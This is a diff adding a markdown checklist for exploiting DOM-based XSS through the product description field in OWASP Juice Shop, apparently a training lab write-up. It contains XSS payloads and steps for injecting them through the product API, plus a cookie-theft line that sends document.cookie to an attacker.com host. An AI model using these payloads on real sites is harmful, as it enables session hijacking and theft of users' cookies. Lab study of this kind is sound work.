@@ -1,0 +1,99 @@
+# ✅ To-Do – Method 4: DOM-Based XSS via Product Description Field
+
+This checklist tracks the workflow of exploiting a DOM-based Cross-Site Scripting vulnerability through the `description` field of a product in OWASP Juice Shop. The core idea is to exploit a reflected injection point where the input is rendered into the DOM without sanitization, typically via unsafe sinks like `innerHTML`.
+
+---
+
+## 🔹 Task Breakdown:
+
+### 🔍 [x] Identify Vulnerable Entry Point: Product Description Field
+- Investigate whether the application provides:
+  - An administrative product editor interface
+  - An unauthenticated or weakly authenticated API endpoint like `/api/Products/:id`
+- Use DevTools, Burp Suite, or Postman to inspect the HTTP requests and locate the product object structure.
+- Confirm that the `description` field is reflected on the client-side when viewing the product detail page.
+
+---
+
+### 💉 [x] Inject Malicious Script Payload into Description Field
+- Choose a payload that demonstrates script execution without relying on external dependencies:
+  ```html
+  <script>alert('Product Description XSS')</script>
+Alternatively, use an obfuscated or encoded payload to bypass basic filters:
+
+html
+Copy code
+<img src=x onerror=alert('XSS')>
+<svg/onload=alert('XSS')>
+Inject payload via PUT/POST request to /api/Products/:id or through the UI (if allowed).
+
+🧪 [x] Confirm Payload Execution on Product Page Render
+Visit the affected product’s public-facing detail page.
+
+Ensure the payload is parsed and executed by the browser:
+
+A popup alert should appear instantly (alert() function)
+
+Inspect the DOM to verify that the payload was injected unsanitized
+
+Check for rendering through innerHTML or template bindings ({{description}}) in Angular.
+
+📸 [x] Capture Screenshot as Proof of Exploitation
+Take a clear screenshot displaying:
+
+The alert box triggered by the payload
+
+The product detail page in the background
+
+The Juice Shop scoreboard showing the “Bonus Payload Challenge” as completed
+
+Save the screenshot with a clear naming convention, such as:
+
+mathematica
+Copy code
+XSS-Product-Description-Payload.png
+🚀 [ ] Push Exploit Artifacts to GitHub Repository
+Organize and stage all relevant files:
+
+README.md with technical description of attack
+
+To-Do-Product-Description-XSS.md with task flow
+
+payload.txt containing raw and encoded versions
+
+XSS-Product-Description-Payload.png as evidence
+
+Run Git version control commands:
+
+bash
+Copy code
+git add .
+git commit -m "💉 Method-4: DOM XSS via product description – payloads, PoC, documentation"
+git push origin main
+📌 Optional Follow-Ups
+Test for CSP headers to understand exploit feasibility in locked-down environments.
+
+Try advanced payloads to simulate:
+
+Session hijacking
+
+Token exfiltration
+
+Cookie theft using:
+
+html
+Copy code
+<script>fetch('http://attacker.com/log?cookie=' + document.cookie)</script>
+📁 Folder Structure
+mathematica
+Copy code
+OWASP-Juice-Shop-Bonus-Payload/
+└── Method-4-Product-Description-XSS/
+    ├── README.md
+    ├── To-Do-Product-Description-XSS.md
+    ├── payload.txt
+    ├── XSS-Product-Description-Payload.png
+✅ Once complete, Method 4 will be fully documented and version-controlled for reference, report inclusion, or submission during assessments.
+
+🧠 Remember: DOM XSS in data-driven fields is subtle but critical — always trace where the user data ends up in the DOM and how it’s rendered.
+
